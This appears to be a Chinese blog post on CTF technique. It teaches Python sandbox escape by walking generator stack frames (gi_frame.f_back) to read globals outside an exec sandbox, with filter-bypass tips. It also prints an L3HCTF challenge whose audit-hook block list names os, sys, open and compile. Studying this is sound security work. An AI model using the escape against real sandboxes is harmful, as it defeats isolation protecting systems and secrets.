@@ -1,0 +1,310 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>python栈帧沙箱逃逸 | GRYS的博客</title><meta name="author" content="GAOREN"><meta name="copyright" content="GAOREN"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="一、生成器生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。 在 Python 中，生成器可以通过两种方式创建： 1、生成器函数：定义一个函数，使用 yield 关键字生成值，每次调用生成器函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python栈帧沙箱逃逸">
+<meta property="og:url" content="https://gaorenyusi.online/2024/06/11/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="GRYS的博客">
+<meta property="og:description" content="一、生成器生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。 在 Python 中，生成器可以通过两种方式创建： 1、生成器函数：定义一个函数，使用 yield 关键字生成值，每次调用生成器函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://erji.gaorenyusi.online/img/13.jpg">
+<meta property="article:published_time" content="2024-06-11T14:45:36.000Z">
+<meta property="article:modified_time" content="2024-06-11T14:47:38.191Z">
+<meta property="article:author" content="GAOREN">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://erji.gaorenyusi.online/img/13.jpg"><link rel="shortcut icon" href="https://erji.gaorenyusi.online/img/4.jpg"><link rel="canonical" href="https://gaorenyusi.online/2024/06/11/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'python栈帧沙箱逃逸',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-11 22:47:38'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/opacity.css"><link rel="stylesheet" href="/css/touming.css"><link rel="stylesheet" href="/css/mouse.css"><link rel="stylesheet" href="/css/loading-img.css"><link rel="stylesheet" href="/css/cust.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/universe.css"><meta name="generator" content="Hexo 7.1.1"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (ture) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--if theme.preloader--><!--  !=partial('includes/loading/loaded.ejs', {}, {cache:theme.fragment_cache})--><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://erji.gaorenyusi.online/img/4.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://erji.gaorenyusi.online/img/13.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="GRYS的博客"><span class="site-name">GRYS的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">python栈帧沙箱逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-11T14:45:36.000Z" title="发表于 2024-06-11 22:45:36">2024-06-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-11T14:47:38.191Z" title="更新于 2024-06-11 22:47:38">2024-06-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="python栈帧沙箱逃逸"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="一、生成器"><a href="#一、生成器" class="headerlink" title="一、生成器"></a><strong>一、生成器</strong></h3><p>生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。<font color="yellow">生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值</font>。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。</p>
+<p>在 Python 中，生成器可以通过两种方式创建：</p>
+<p><em>1、生成器函数：定义一个函数，使用 <code>yield</code> 关键字生成值，每次调用生成器函数时，生成器会暂停并返回一个值，下次调用时会从暂停的地方继续执行。（符合上面的每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。</em></p>
+<p>示例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen)) <span class="comment"># 第一次调用，输出 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen)) <span class="comment"># 第二次调用，输出 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gen)) <span class="comment"># 第三次调用，输出 3</span></span><br></pre></td></tr></table></figure>
+
+<p><em>2、生成器表达式：使用类似列表推导式的语法，但使用圆括号而不是方括号，可以用来创建生成器对象。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用（依然符合每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。</em></p>
+<p>示例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gen = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(gen))  <span class="comment"># 输出 [0, 1, 4, 9, 16]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="二、栈帧-frame"><a href="#二、栈帧-frame" class="headerlink" title="二、栈帧(frame)"></a><strong>二、栈帧(frame)</strong></h3><p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
+<p>栈帧包含了以下几个重要的属性：<br><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</p>
+<h3 id="三、生成器的属性"><a href="#三、生成器的属性" class="headerlink" title="三、生成器的属性"></a><strong>三、生成器的属性</strong></h3><p><code>gi_code</code>: 生成器对应的code对象。<br><code>gi_frame</code>: 生成器对应的frame（栈帧）对象。<br><code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
+<p><em>着重介绍一下 gi_frame 属性</em><br><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p>
+<p>例子：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取生成器的当前帧信息</span></span><br><span class="line">frame = gen.gi_frame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出生成器的当前帧信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</span><br></pre></td></tr></table></figure>
+
+<p>同理利用<code>gi_code</code>属性也可以获得生成器的相关代码对象属性：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取生成器的当前代码信息</span></span><br><span class="line">code = gen.gi_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出生成器的当前代码信息</span></span><br><span class="line"><span class="built_in">print</span>( code.co_name)</span><br><span class="line"><span class="built_in">print</span>(code.co_code)</span><br><span class="line"><span class="built_in">print</span>( code.co_consts)</span><br><span class="line"><span class="built_in">print</span>(code.co_filename)</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、利用栈帧沙箱逃逸"><a href="#四、利用栈帧沙箱逃逸" class="headerlink" title="四、利用栈帧沙箱逃逸"></a><strong>四、利用栈帧沙箱逃逸</strong></h3><p>原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表<br>一个简单的例子：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  <span class="comment">#生成器</span></span><br><span class="line">    frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line">    b = frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>] <span class="comment">#返回并获取前一级栈帧的globals</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">b=waff()</span><br></pre></td></tr></table></figure>
+
+<p>或者：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  <span class="comment">#生成器</span></span><br><span class="line">    frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line">    b = frame.f_back.f_globals[<span class="string">&#x27;s3cret&#x27;</span>] <span class="comment">#返回并获取前一级栈帧的globals</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">b=waff()</span><br></pre></td></tr></table></figure>
+
+<p>为什么都行呢，可以把frame这个栈帧对象打印看看：</p>
+<p>分别是：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;frame at <span class="number">0x0000020F97255040</span>, file <span class="string">&#x27;D:\\yinwenmingtwo\\PythonCode\\测试\\1.py&#x27;</span>, line <span class="number">9</span>, code waff&gt;</span><br><span class="line">&lt;frame at <span class="number">0x00000176546465B0</span>, file <span class="string">&#x27;D:\\yinwenmingtwo\\PythonCode\\测试\\1.py&#x27;</span>, line <span class="number">13</span>, code &lt;module&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在看看上面的<code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>
+<p>不难看出这里函数和模块本就同在一个全局，所以都有属性s3cret，怎么看到没到全局？直接看file就能看出。</p>
+<p>在给个例子：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #生成器</span></span><br><span class="line"><span class="string">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    print(frame)</span></span><br><span class="line"><span class="string">    print(frame.f_back)</span></span><br><span class="line"><span class="string">    print(frame.f_back.f_back)</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="https://s2.loli.net/2024/06/11/ltbZOyrMs7YK1Bh.png" alt="QQ截图20240611190601"></p>
+<p>这个其实得从下向上看，最先的帧是exec，然后是b&#x3D;，最后是8line那里的代码。一步一步回到全局变量</p>
+<h3 id="五、简单绕过"><a href="#五、简单绕过" class="headerlink" title="五、简单绕过"></a><strong>五、简单绕过</strong></h3><p><code>next</code>过滤可以用<code>list</code>，<code>send</code>，和生成器表达式进行绕过，</p>
+<p><code>yield</code>过滤也可以用生成器表达式进行绕过</p>
+<h3 id="六、例题"><a href="#六、例题" class="headerlink" title="六、例题"></a><strong>六、例题</strong></h3><h4 id="2024L3HCTF"><a href="#2024L3HCTF" class="headerlink" title="2024L3HCTF"></a>2024L3HCTF</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;&lt;codehere&gt;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    codes.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;__&quot;</span> <span class="keyword">in</span> codes:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;__ bypass!!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">codes+=<span class="string">&quot;\nres=factorization(c)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(codes)</span><br><span class="line"><span class="built_in">locals</span>=&#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>,<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">res=<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blackFunc</span>(<span class="params">oldexit</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">event, args</span>):</span><br><span class="line">        blackList = [<span class="string">&quot;process&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;sys&quot;</span>,<span class="string">&quot;interpreter&quot;</span>,<span class="string">&quot;cpython&quot;</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;compile&quot;</span>,<span class="string">&quot;__new__&quot;</span>,<span class="string">&quot;gc&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> blackList:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;noooooooooo&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                oldexit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;&lt;judgecode&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">sys.addaudithook(blackFunc(os._exit))</span><br><span class="line"><span class="built_in">exec</span>(code,&#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>)</span><br><span class="line"></span><br><span class="line">p=<span class="built_in">int</span>(<span class="built_in">locals</span>[<span class="string">&quot;res&quot;</span>][<span class="number">0</span>])</span><br><span class="line">q=<span class="built_in">int</span>(<span class="built_in">locals</span>[<span class="string">&quot;res&quot;</span>][<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span>(p&gt;<span class="number">1e5</span> <span class="keyword">and</span> q&gt;<span class="number">1e5</span> <span class="keyword">and</span> p*q==<span class="built_in">int</span>(<span class="string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Correct!&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>就是可以执行一些命令，满足下面的if条件就行。</p>
+<p>做了一些过滤，过滤掉了双下划线，<code>&#123;&quot;__builtins__&quot;: None&#125;</code> 置空了<code>__builtins__</code>。</p>
